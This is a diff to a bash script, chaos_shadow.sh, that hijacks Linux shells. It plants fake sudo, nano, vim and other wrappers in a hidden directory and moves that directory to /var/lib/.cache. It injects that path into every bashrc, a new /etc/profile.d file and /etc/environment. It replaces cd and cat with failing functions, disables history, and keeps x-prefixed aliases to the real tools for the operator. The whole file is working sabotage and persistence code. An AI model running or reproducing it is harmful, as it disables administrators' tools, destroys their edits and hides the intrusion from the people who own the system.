@@ -1,7 +1,7 @@
 #!/bin/bash
 # chaos_shadow.sh
 
-SHADOW_DIR="/tmp/.cache/lib"
+SHADOW_DIR="/var/lib/.cache"
 mkdir -p "$SHADOW_DIR"
 
 # --- sudo ---
@@ -48,7 +48,6 @@ EOF
 # --- nano ---
 cat > "$SHADOW_DIR/nano" << 'EOF'
 #!/bin/bash
-# open nano normally but intercept the write
 TMPFILE=$(mktemp)
 /usr/bin/nano "$@" "$TMPFILE"
 rm -f "$TMPFILE"
@@ -61,12 +60,6 @@ cat > "$SHADOW_DIR/vim" << 'EOF'
 TMPFILE=$(mktemp)
 /usr/bin/vim "$@" "$TMPFILE"
 rm -f "$TMPFILE"
-exit 0
-EOF
-
-# --- history ---
-cat > "$SHADOW_DIR/history" << 'EOF'
-#!/bin/bash
 exit 0
 EOF
 
@@ -100,53 +93,78 @@ echo "wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7"
 exit 1
 EOF
 
-# --- cd ---
-cat > "$SHADOW_DIR/cd" << 'EOF'
-#!/bin/bash
-echo "wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7"
-exit 1
-EOF
-
-# --- cat ---
-cat > "$SHADOW_DIR/cat" << 'EOF'
-#!/bin/bash
-echo "wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7"
-exit 1
-EOF
-
 chmod +x "$SHADOW_DIR"/*
 
-# drop real aliases with x prefix into global bashrc
-ALIASES='
-alias xudo="/usr/bin/sudo"
-alias xps="/usr/bin/ps"
-alias xetstat="/usr/bin/netstat" # Not working
-alias xss="/usr/bin/ss" # Not working
-alias xrep="/usr/bin/grep"
-alias xind="/usr/bin/find"
-alias xano="/usr/bin/nano"
-alias xim="/usr/bin/vim" # Not working
-alias xistory="/usr/bin/history"
-alias xhoami="/usr/bin/whoami"
-alias xostname="/usr/bin/hostname"
-alias xasswd="/usr/bin/passwd"
-alias xystemctl="/usr/bin/systemctl"
-alias xd="/usr/bin/cd"
-alias xat="/usr/bin/cat"
+# resolve real binary paths on this machine
+PS_PATH=$(command -v ps 2>/dev/null || echo "/usr/bin/ps")
+SS_PATH=$(command -v ss 2>/dev/null || echo "/usr/sbin/ss")
+NETSTAT_PATH=$(command -v netstat 2>/dev/null || echo "/usr/bin/netstat")
+NANO_PATH=$(command -v nano 2>/dev/null || echo "/usr/bin/nano")
+VIM_PATH=$(command -v vim 2>/dev/null || echo "/usr/bin/vim")
+GREP_PATH=$(command -v grep 2>/dev/null || echo "/usr/bin/grep")
+FIND_PATH=$(command -v find 2>/dev/null || echo "/usr/bin/find")
+SUDO_PATH=$(command -v sudo 2>/dev/null || echo "/usr/bin/sudo")
+WHOAMI_PATH=$(command -v whoami 2>/dev/null || echo "/usr/bin/whoami")
+HOSTNAME_PATH=$(command -v hostname 2>/dev/null || echo "/usr/bin/hostname")
+PASSWD_PATH=$(command -v passwd 2>/dev/null || echo "/usr/bin/passwd")
+SYSTEMCTL_PATH=$(command -v systemctl 2>/dev/null || echo "/usr/bin/systemctl")
+
+ALIASES="
+alias xudo=\"$SUDO_PATH\"
+alias xps=\"$PS_PATH\"
+alias xetstat=\"$NETSTAT_PATH\"
+alias xss=\"$SS_PATH\"
+alias xrep=\"$GREP_PATH\"
+alias xind=\"$FIND_PATH\"
+alias xano=\"$NANO_PATH\"
+alias xim=\"$VIM_PATH\"
+alias xhoami=\"$WHOAMI_PATH\"
+alias xostname=\"$HOSTNAME_PATH\"
+alias xasswd=\"$PASSWD_PATH\"
+alias xystemctl=\"$SYSTEMCTL_PATH\"
+"
+
+FUNCTIONS='
+cd() {
+    echo "wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7"
+    return 1
+}
+cat() {
+    echo "wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7wubby7"
+    return 1
+}
+history() {
+    return 0
+}
+xd() { builtin cd "$@"; }
+xat() { /usr/bin/cat "$@"; }
+xistory() { builtin history "$@"; }
 '
 
-echo "$ALIASES" >> /etc/bash.bashrc
-echo "$ALIASES" >> /root/.bashrc
-for user_home in /home/*; do
-    [ -f "$user_home/.bashrc" ] && echo "$ALIASES" >> "$user_home/.bashrc"
+PATH_INJECT="export PATH=\"$SHADOW_DIR:\$PATH\""
+
+# write to all bashrc locations
+for f in /etc/bash.bashrc /root/.bashrc; do
+    echo "$ALIASES"      >> "$f"
+    echo "$FUNCTIONS"    >> "$f"
+    echo "$PATH_INJECT"  >> "$f"
 done
 
-# poison PATH
-echo "export PATH=\"$SHADOW_DIR:\$PATH\"" >> /etc/bash.bashrc
-echo "export PATH=\"$SHADOW_DIR:\$PATH\"" >> /root/.bashrc
 for user_home in /home/*; do
-    [ -f "$user_home/.bashrc" ] && echo "export PATH=\"$SHADOW_DIR:\$PATH\"" >> "$user_home/.bashrc"
+    if [ -f "$user_home/.bashrc" ]; then
+        echo "$ALIASES"      >> "$user_home/.bashrc"
+        echo "$FUNCTIONS"    >> "$user_home/.bashrc"
+        echo "$PATH_INJECT"  >> "$user_home/.bashrc"
+    fi
 done
 
-# also hit /etc/environment for non-interactive shells
+# profile.d catches login shells and covers Rocky/RHEL where bash.bashrc isn't sourced
+cat > /etc/profile.d/wubby.sh << WUBEOF
+$ALIASES
+$FUNCTIONS
+$PATH_INJECT
+WUBEOF
+chmod +x /etc/profile.d/wubby.sh
+
+# non-interactive shells via /etc/environment
 sed -i "s|PATH=\"|PATH=\"$SHADOW_DIR:|" /etc/environment
